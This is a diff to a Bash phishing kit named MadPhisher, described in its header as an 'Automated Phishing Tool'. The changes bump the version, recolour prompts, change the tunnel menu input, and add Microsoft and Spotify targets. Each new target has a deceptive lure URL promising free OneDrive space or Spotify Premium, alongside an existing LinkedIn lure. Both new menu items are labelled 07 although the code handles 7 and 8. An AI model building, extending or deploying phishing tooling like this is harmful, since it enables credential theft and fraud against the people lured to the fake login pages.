@@ -3,11 +3,11 @@
 
 ##   MadPhisher : 	Automated Phishing Tool
 ##   Author 	: 	Sajid Ibn Nayeem
-##   Version 	: 	1.2
+##   Version 	: 	1.2.4
 ##   Github 	: 	https://github.com/SajidIbnNayeem
 
 
-__version__="1.2"
+__version__="1.2.4"
 
 
 ## DEFAULT HOST & PORT
@@ -188,7 +188,7 @@ about() {
 ## Choose custom port
 cusport() {
 	echo
-	read -n1 -p "${RED}[${WHITE}?${RED}]${GREEN} Do You Want A Custom Port ${ORANGE}[${BLUE}y${ORANGE}/${BLUE}N${ORANGE}]: ${GREEN}" P_ANS
+	read -n1 -p "${RED}[${WHITE}?${RED}]${BLUE} Do You Want A Custom Port ${WHITE}[${GREEN}y${WHITE}/${GREEN}N${WHITE}]: ${GREEN}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
 		echo -e "\n"
 		read -n4 -p "${RED}[${WHITE}-${RED}]${BLUE} Enter Your Custom 4-digit Port [1024-9999] : ${GREEN}" CU_P
@@ -270,14 +270,14 @@ tunnel_menu() {
 	{ clear; banner_small; }
 	cat <<- EOF
 
-		${RED}[${WHITE}01${RED}]${RED} Localhost
+		${WHITE} LOCALHOST
 
 	EOF
 
-	read -p "${BLUE}(★★) Enter (01) for  port forwarding service : ${GREEN}"
+	read -p "${BLUE}(★★) Enter ${RED}[Madphisher] ${BLUE}for  port forwarding service : ${GREEN}"
 
 	case $REPLY in 
-		1 | 01)
+		Madphisher | madphisher)
 			start_localhost;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
@@ -461,6 +461,8 @@ main_menu() {
 ${RED}[${WHITE}04${RED}]${YELLOW} Twitter
 		${RED}[${WHITE}05${RED}]${YELLOW} Snapchat 
 		${RED}[${WHITE}06${RED}]${YELLOW} Linkedin
+		${RED}[${WHITE}07${RED}]${YELLOW} Microsoft
+		${RED}[${WHITE}07${RED}]${YELLOW} Spotify
 		${RED}[${WHITE}99${RED}]${YELLOW} About
 		${RED}[${WHITE}00${RED}]${YELLOW} Exit
 	EOF
@@ -486,7 +488,14 @@ ${RED}[${WHITE}04${RED}]${YELLOW} Twitter
 			website="linkedin"
 			mask='https://get-a-premium-plan-for-linkedin-free'
 			tunnel_menu;;
-            
+        7 | 07)
+			website="microsoft"
+			mask='https://unlimited-onedrive-space-for-free'
+			tunnel_menu;;
+		8 | 08)
+			website="spotify"
+			mask='https://convert-your-account-to-spotify-premium'
+			tunnel_menu;;
 		99)
 			about;;
 		0 | 00 )
